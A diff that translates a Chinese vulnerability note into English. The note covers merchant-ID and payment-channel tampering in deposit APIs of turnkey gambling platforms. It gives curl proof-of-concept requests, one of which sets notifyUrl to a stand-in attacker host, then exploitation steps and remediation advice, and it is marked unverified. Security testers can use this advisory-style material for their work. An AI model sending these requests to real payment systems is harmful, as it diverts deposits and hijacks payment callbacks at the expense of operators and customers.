@@ -1,60 +1,60 @@
 ﻿---
-title: 支付通道 / 商户号篡改（充值进攻击者账户）
-cve: 无（业务逻辑）
+title: Payment-channel / merchant-ID tampering (deposits sent to the attacker's account)
+cve: None (business logic)
 severity: critical
 cvss: 9.4
-product: 自研充值/支付路由（博彩包网）
-versions: 任意
+product: Custom deposit/payment routing (turnkey gambling platforms)
+versions: Any
 ports: 80, 443
-keywords: 支付通道, 商户号, 充值, 路由, 篡改, 资金
-entry: /api/pay/create 的 channelId / merchantId / notifyUrl
+keywords: payment channel, merchant ID, deposit, routing, tampering, funds
+entry: channelId / merchantId / notifyUrl in /api/pay/create
 verified: false
-sources: 公开资料整理（业务逻辑类，无 CVE）
+sources: Compiled from public sources (business logic flaws; no CVE)
 ---
 
-## 指纹
+## Fingerprints
 
 ```
 POST /api/pay/create   {"amount":100,"channelId":3,"merchantId":""}
-GET  /api/pay/channels → 返回可用通道列表
+GET  /api/pay/channels → Returns the available channel list
 ```
 
-## 前置条件
+## Prerequisites
 
-- 普通会员账号；能抓充值下单请求。
+- An ordinary member account; ability to capture deposit-order requests.
 
 ## PoC
 
 ```bash
-# 1) 正常下单，记下订单号与通道
+# 1) Create a normal order; record its number and channel
 curl -s -X POST https://target/api/pay/create -H "Authorization: Bearer <t>" \
   -H 'Content-Type: application/json' -d '{"amount":100,"channelId":3}' | jq '.data'
 
-# 2) 换通道/商户号，看是否被采纳
+# 2) Change the channel/merchant ID and check whether it is accepted
 curl -s -X POST https://target/api/pay/create -H "Authorization: Bearer <t>" \
   -H 'Content-Type: application/json' \
-  -d '{"amount":100,"channelId":3,"merchantId":"<攻击者商户号>","notifyUrl":"https://attacker/n"}' | jq '.data.payUrl'
-# 判定：返回的支付链接商户/收款方变成攻击者的 = 命中
+  -d '{"amount":100,"channelId":3,"merchantId":"<attacker-merchant-ID>","notifyUrl":"https://attacker/n"}' | jq '.data.payUrl'
+# Confirmation: the returned payment link's merchant/payee changes to the attacker's
 ```
 
 ```bash
-# 3) 若只回传 payUrl，检查其参数里是否出现可控的 merchant/uid
+# 3) If only payUrl is returned, inspect its parameters for controllable merchant/uid values
 curl -s -X POST https://target/api/pay/create -H "Authorization: Bearer <t>" \
   -d '{"amount":1,"channelId":3}' | grep -o 'merchant[^&]*'
 ```
 
-## 利用步骤
+## Exploitation Steps
 
-1. 先正常下一单（1 元）走通；
-2. 改 merchantId/notifyUrl，看下单回包是否采纳；
-3. 采纳即"充值进攻击者"或"回调被劫持"——资金面，直接 critical；
-4. 证据：两条下单回包的 payUrl 差异。
+1. First create a normal order (1 yuan) to establish the workflow;
+2. Change merchantId/notifyUrl and check whether the order response accepts them;
+3. Acceptance means "deposits sent to the attacker" or "callback hijacking"—financial impact, immediately critical;
+4. Evidence: payUrl differences between the two order responses.
 
-## 修复与缓解
+## Remediation and Mitigation
 
-- 通道与商户号只由服务端按产品配置选；请求体里的此类字段一律忽略。
-- 回调地址固定，签名校验金额/商户/订单号。
+- Select channels and merchant IDs only server-side according to product configuration; ignore all such request-body fields.
+- Fix the callback address and verify signatures covering amount/merchant/order number.
 
-## 参考
+## References
 
-- OWASP WSTG-BUSL-01；CWE-472。
+- OWASP WSTG-BUSL-01; CWE-472.
